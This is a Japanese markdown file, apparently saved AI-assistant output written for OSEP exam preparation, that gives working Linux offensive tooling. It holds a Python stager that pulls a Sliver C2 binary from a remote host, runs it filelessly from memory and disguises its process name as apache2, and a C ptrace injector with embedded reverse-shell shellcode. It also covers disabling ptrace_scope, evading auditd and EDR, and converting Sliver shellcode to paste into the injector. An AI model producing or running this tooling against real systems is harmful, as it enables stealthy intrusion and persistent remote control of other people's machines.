@@ -1,0 +1,275 @@
+## Python 3によるインメモリ実行スタージャー
+```
+#!/usr/bin/env python3
+import os
+import urllib.request
+import sys
+
+def main():
+    # 1. C2サーバー（Kaliなど）のホストとポートを指定
+    # ※検証環境に合わせて変更してください
+    c2_url = "http://192.168.X.X:8080/sliver_linux.elf"
+    
+    print("[*] Downloading payload into memory...")
+    try:
+        # ディスクを介さず、メモリ上の変数（bytes）に直接格納
+        with urllib.request.urlopen(c2_url) as response:
+            payload = response.read()
+    except Exception as e:
+        print(f"[-] Download failed: {e}")
+        sys.exit(1)
+
+    print("[*] Creating anonymous memory file...")
+    # 2. memfd_createでメモリ内に匿名ファイル（ファイル記述子）を作成
+    # 引数の文字列は/proc/self/fd/ 内に表示される名前（監査ログを意識して偽装可能）
+    # MFD_CLOEXEC (1) を指定して、子プロセスに不要なFDを引き継がないようにする
+    try:
+        fd = os.memfd_create("systemd-service", flags=os.MFD_CLOEXEC)
+    except AttributeError:
+        print("[-] os.memfd_create is not supported on this Python/OS version.")
+        sys.exit(1)
+
+    # 3. メモリ内のファイル記述子にC2バイナリのデータを書き込む
+    os.write(fd, payload)
+
+    # 4. プロセス偽装（argv[0]の書き換え）
+    # ps aux コマンドなどで表示されるプロセス名を正規のもの（例: apache2）に見せかける
+    fake_process_name = "/usr/sbin/apache2"
+    argv = [fake_process_name]
+    env = os.environ
+
+    print("[+] Executing payload via fexecve...")
+    # 5. fexecveを実行して、現在のPythonプロセスをメモリ上のC2バイナリで上書き
+    # ディスク上のパスではなく、ファイル記述子(fd)から直接実行するため完全ファイルレス
+    try:
+        os.fexecve(fd, argv, env)
+    except Exception as e:
+        print(f"[-] Execution failed: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
+```
+
+## Linux ptrace プロセスインジェクション 実践ガイド
+- Linux環境における C2インプラント（Sliver等）のインメモリ展開において、最も基礎的かつ強力な手法の一つが ptrace システムコールを利用したプロセスインジェクションです。
+- 本ドキュメントでは、x86_64 Linux環境を対象とした ptrace インジェクターの仕組み、具体的なC言語の実装コード、および検証手順について詳しく解説します。
+
+## 1. ptrace インジェクションの動作プロセス
+- Windowsにおける CreateRemoteThread を用いたインジェクションと同様に、Linuxでは以下の手順で他プロセスにコードを注入します。
+```
+[攻撃者プロセス]                            [ターゲットプロセス(PID)]
+      |                                           |
+      |-- (1) PTRACE_ATTACH --------------------> | (シグナルにより一時停止)
+      |-- (2) waitpid() で停止を確認 ------------>|
+      |-- (3) PTRACE_GETREGS (レジスタ退避) ------>|
+      |-- (4) PTRACE_POKETEXT (コード注入) ------->| (メモリの実行可能領域に書き込み)
+      |-- (5) PTRACE_SETREGS (RIPを書き換え) ---->| (プログラムカウンタをシェルコードへ)
+      |-- (6) PTRACE_DETACH (接続解除・再開) ----> | (注入されたシェルコードが実行される)
+```
+
+## ptrace_injector.c
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/user.h>
+#include <unistd.h>
+
+// 検証用シェルコード (x86_64 用 Linux リバースシェル)
+// ※ 127.0.0.1:4444 に接続を試みます。
+// ※ 実際の攻撃用には Sliver の 'generate --format shellcode' で出力したバイナリを流用します。
+unsigned char shellcode[] = 
+    "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02"
+    "\x5f\x0f\x05\x48\x97\x6a\x10\x5a\x57\xc7\x44\x24\xfc\x7f\x00\x00"
+    "\x01\x66\xc7\x44\x24\xfa\x11\x5c\xc7\x44\x24\xf8\x02\x00\x00\x00"
+    "\x48\x8d\x74\x24\xf8\x0f\x05\x48\x31\xf6\x6a\x21\x58\x0f\x05\x48"
+    "\xff\xc6\x6a\x21\x58\x0f\x05\x48\x31\xf6\x6a\x3b\x58\x99\x48\xbb"
+    "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\x52\x57\x48"
+    "\x8d\x3e\x0f\x05";
+
+// 8バイト(1ワード)単位でターゲットプロセスのメモリに書き込む関数
+void inject_data(pid_t target_pid, uint64_t dest_addr, unsigned char *src, size_t len) {
+    size_t i;
+    uint64_t *s = (uint64_t *)src;
+    uint64_t *d = (uint64_t *)dest_addr;
+
+    for (i = 0; i < len; i += 8, s++, d++) {
+        if (ptrace(PTRACE_POKETEXT, target_pid, d, *s) < 0) {
+            perror("[-] PTRACE_POKETEXT failed");
+            exit(1);
+        }
+    }
+}
+
+int main(int argc, char *argv[]) {
+    pid_t target_pid;
+    struct user_regs_struct regs, original_regs;
+    int status;
+
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
+        exit(1);
+    }
+
+    target_pid = atoi(argv[1]);
+    printf("[*] Attaching to process %d...\n", target_pid);
+
+    // 1. ターゲットプロセスにアタッチ
+    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
+        perror("[-] PTRACE_ATTACH failed");
+        exit(1);
+    }
+
+    // 2. ターゲットプロセスがシグナルによって停止するのを待機
+    waitpid(target_pid, &status, 0);
+    if (!WIFSTOPPED(status)) {
+        fprintf(stderr, "[-] Target process did not stop.\n");
+        exit(1);
+    }
+
+    // 3. 現在のCPUレジスタの状態（オリジナル）を取得
+    if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) < 0) {
+        perror("[-] PTRACE_GETREGS failed");
+        exit(1);
+    }
+    // 後で復旧できるようにコピーを保存
+    original_regs = regs;
+    printf("[+] Original RIP: 0x%llx\n", regs.rip);
+
+    // 4. シェルコードをプロセスの現在の instruction pointer (RIP) の位置に書き込む
+    // ※実戦では、プロセスのメモリマップ (/proc/<pid>/maps) から r-xp (実行・読込可能) な
+    //   領域を特定してそこに書き込む、あるいは mmap を強制実行して領域を確保するのが一般的です。
+    //   ここではデモとして、現在のRIPが指す実行可能なメモリ領域に直接上書きします。
+    printf("[*] Injecting shellcode at RIP: 0x%llx...\n", regs.rip);
+    inject_data(target_pid, regs.rip, shellcode, sizeof(shellcode));
+
+    // 5. レジスタの書き換え（RIPはそのままに保つが、シェルコードをスムーズに実行させるための調整）
+    // 通常、アタッチ時のRIPの先頭からそのまま実行するため、RIPの値は据え置き、または調整を施します。
+    if (ptrace(PTRACE_SETREGS, target_pid, NULL, &regs) < 0) {
+        perror("[-] PTRACE_SETREGS failed");
+        exit(1);
+    }
+
+    // 6. プロセスからデタッチ（接続を解除してターゲットプロセスの実行を再開）
+    printf("[*] Detaching and executing shellcode...\n");
+    if (ptrace(PTRACE_DETACH, target_pid, NULL, NULL) < 0) {
+        perror("[-] PTRACE_DETACH failed");
+        exit(1);
+    }
+
+    printf("[+] Injection completed successfully!\n");
+    return 0;
+}
+```
+## 3. ラボ環境でのコンパイルとテスト手順
+
+実際に動作を確認するためのステップです。
+
+### ステップ1: 待ち受けリスナー（Kali側）の起動
+シェルコードが接続するポート `4444` を待ち受け状態にします。
+```bash
+nc -lvnp 4444
+```
+
+### ステップ2: ターゲットプロセスの準備
+テスト用に、バックグラウンドで動き続ける無害なプロセス（例: `sleep`）を起動します。
+```bash
+sleep 1000 &
+# 起動したプロセスのPIDを確認
+export TARGET_PID=$!
+echo "Target PID: $TARGET_PID"
+```
+
+### ステップ3: インジェクターのコンパイルと実行
+C言語コードをコンパイルし、root権限（または同じユーザー権限）でインジェクションを実行します。
+```bash
+gcc ptrace_injector.c -o ptrace_injector
+sudo ./ptrace_injector $TARGET_PID
+```
+
+### 結果確認
+`nc` で待ち受けていたリスナーにシェル（接続）が戻ってくれば、インジェクションは成功です。ターゲットの `sleep` プロセスのメモリ空間を乗っ取って、別のコードを動作させたことになります。
+
+---
+
+## 4. OSEP / 実戦における制限と対策
+
+`ptrace` は強力ですが、モダンなLinux環境ではいくつかのセキュリティ制限が課されています。
+
+### ① `yama/ptrace_scope` による制限
+多くのLinuxディストリビューション（Ubuntu等）では、デフォルトで「親プロセス（または特権ユーザー）以外への `ptrace` アタッチ」が禁止されています。
+
+* **状態の確認:**
+  ```bash
+  cat /proc/sys/kernel/yama/ptrace_scope
+  ```
+  * `1` の場合: 自分自身が起動した子プロセスにしかアタッチできません（他の一般プロセスへのインジェクションは失敗します）。
+  * `0` の場合: 同一ユーザーのプロセスであれば自由にアタッチ可能です。
+
+* **対策（検証用）:**
+  一時的にこのセキュリティ制限を無効にするには、root権限で以下を実行します。
+  ```bash
+  sudo sysctl -w kernel.yama.ptrace_scope=0
+  ```
+  ※OSEPの試験環境やラボで権限昇格後に永続化や横展開を行う場合は、すでに `root` を奪取していることが多いため、この制限は実質的に無視できます（root権限があれば、任意のプロセスにアタッチ可能です）。
+
+### ② ディテクタへの配慮 (OPSEC)
+* `ptrace` を呼び出すと、システム監査ログ（Auditd）にシステムコールが記録され、EDRや監視エージェントによって異常なアタッチ挙動として検知されるリスクがあります。
+* 回避策として、`ptrace` を直接呼ばず、事前に侵入したユーザーのシェル環境で `/proc/<PID>/mem` ファイルへの直接書き込み権限を悪用するインジェクション手法（`proc_mem_write`）なども、近年はよく使われます。
+
+## 今回の手法をSliverに応用する場合
+- 上記ガイド中の shellcode[] 変数の部分を、Sliverで生成した Linux用のシェルコードに置き換えるだけです。
+```
+# SliverでLinux用シェルコード（Rawバイナリ）を生成
+generate --mtls <Kali_IP> --os linux --format shellcode --save sliver_linux.bin
+生成された `sliver_linux.bin` のバイナリデータを16進数配列（`\x48\x31...` 形式）に変換し、Cコードの配列部分にペーストして再コンパイルします。
+これを実行すれば、既存の正規プロセス（Webサーバーやシステムデーモンなど）のメモリ空間を乗っ取る形で、ディスクに一切ファイルを残さずにSliverのコネクションをKaliに呼び戻すことができます。
+OSEPのラボや本番に向けて、まずは安全な仮想環境で `yama/ptrace_scope` を調整しながら動作検証を進めてみてください。応援しています！
+```
+## 提示していただいたCanvasドキュメント内に記述がある、Sliverで生成した生のシェルコードバイナリ（sliver_linux.bin）を、C言語のソースコードに埋め込める16進数配列（\x48\x31... 形式）へ変換する方法
+#### 方法1：hexdump コマンドを使う（最もシンプルで一般的）
+- Linux環境にほぼ標準でインストールされている hexdump コマンドを使用する方法です。
+- 以下のコマンドを実行すると、バイナリを \x48\x31... 形式に整形して1行で出力します。
+```Bash
+hexdump -v -e '"\\" "x" "%02x"' sliver_linux.bin
+```
+- 出力例:
+  - `\x48\x31\xc0\x48\x31\xd2...`
+    - 解説: -e オプションで出力フォーマットを指定しています。ダブルクォーテーションで囲まれた各バイトの前に \x を強制的に付与して出力するフォーマットを定義しています。
+#### 方法2：xxd コマンドを使う（改行処理も自動化）
+- xxd は Vim に付属している強力なバイナリダンプツールです。シェルコードのサイズが非常に大きく、ソースコード上である程度改行してきれいに整形したい場合に非常に便利です。
+- 以下のコマンドは、15バイトごとに自動で改行を入れ、C言語の文字列リテラルとしてそのままコピー＆ペーストできるように成形します。
+```Bash
+xxd -i -p sliver_linux.bin | sed 's/\(..\)/\\x\1/g' | fold -w 60 | sed 's/^/"/;s/$/"/'
+```
+- 出力例:
+```Plaintext
+"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a"
+"\x02\x5f\x0f\x05\x48\x97\x6a\x10\x5a\x57\xc7\x44\x24\xfc\x7f"
+...
+```
+  - 解説:
+    - xxd -i -p でプレーンな16進数文字列に変換します。
+    - sed 's/\(..\)/\\x\1/g' で2文字（1バイト）ごとに \x を付加します。
+    - fold -w 60 で指定幅ごとに改行します。
+    - 最後の sed で各行の先頭と末尾にダブルクォーテーション " を補うため、C言語の構文上、連続した文字列としてそのまま埋め込めます。
+
+#### 方法3：Pythonワンライナーを使う（環境に依存しにくい）
+- Python3がインストールされていれば、以下のワンライナーでも一瞬で変換できます。追加のコマンドをインストールしたくない場合に役立ちます。
+```Bash
+python3 -c "import sys; print(''.join([f'\\x{b:02x}' for b in open('sliver_linux.bin', 'rb').read()]))"
+```
+- 変換後のCコードへの適用方法
+  - 上記いずれかのコマンドで得られた出力を、Canvas内の ptrace_injector.c にある shellcode[] 配列に以下のように貼り付けることで、Sliverインプラントをプロセスへ直接インジェクションできるようになります。
+```C
+// Sliverで生成し、16進数変換したシェルコードをここに貼り付けます
+unsigned char shellcode[] = 
+    "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6..." // 変換したデータ
+    "...";
+```
+- まずは hexdump や xxd を Kali Linux のターミナルで試してみてください。手順についてさらに気になる点があれば、いつでもお尋ねください！
